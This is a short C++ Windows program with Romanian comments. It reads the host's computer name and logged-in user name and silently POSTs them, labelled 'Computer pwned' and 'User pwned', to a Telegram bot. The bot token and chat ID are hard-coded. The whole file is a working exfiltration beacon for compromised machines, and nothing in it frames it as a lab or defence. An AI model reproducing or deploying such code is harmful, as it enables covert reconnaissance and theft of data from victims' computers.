#include <Windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")
#include <iostream>

void main() {
	HINTERNET hSession = WinHttpOpen(
		NULL, // user agent - LPCWSTR
		WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, // foloseste setarile proxy ale sistemului
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS,
		WINHTTP_FLAG_SECURE_DEFAULTS
	);

	HINTERNET hConnect = WinHttpConnect(
		hSession,
		L"api.telegram.org", // host-ul accesat
		INTERNET_DEFAULT_HTTPS_PORT, // folosim portul https - 443
		0
	);

	HINTERNET hReq = WinHttpOpenRequest(
		hConnect,
		L"POST", // metoda folosita
		L"bot5876725645:AAEGt_hN-rV-Z8iPr9edvc7e7CtZ2QuSUrg/sendMessage", // endpoint-ul accesat
		NULL, // NULL - foloseste HTTP/1.1
		WINHTTP_NO_REFERER, // nu va folosi referer
		WINHTTP_DEFAULT_ACCEPT_TYPES,
		WINHTTP_FLAG_SECURE
	);

	LPSTR wkstn_name = (LPSTR)malloc((MAX_COMPUTERNAME_LENGTH + 1) * sizeof(char));
	DWORD wkstn_name_len = MAX_COMPUTERNAME_LENGTH;

 	if (!GetComputerNameA(wkstn_name, &wkstn_name_len)) {
		std::cout << GetLastError();
		return;
	}

	LPSTR user_name = (LPSTR)malloc((MAX_COMPUTERNAME_LENGTH + 1) * sizeof(char));
	DWORD user_name_len = MAX_COMPUTERNAME_LENGTH;

	if (!GetUserNameA(user_name, &user_name_len)) {
		return;
	}

	std::string string_data = "{\"chat_id\": \"5073190288\", \"text\": \"Computer pwned: " + std::string(wkstn_name) + "\nUser pwned : " + std::string(user_name) + "\", \"disable_notification\": true}";
	LPSTR post_body = const_cast<char*>(string_data.c_str());

	if (!WinHttpSendRequest(
		hReq,
		L"Content-Type: application/json",
		-1L,
		post_body,
		strlen(post_body),
		strlen(post_body),
		0
	)) {
		return;
	}

	if (!WinHttpReceiveResponse(
		hReq,
		NULL
	)) {
		return;
	}

	free(wkstn_name);
}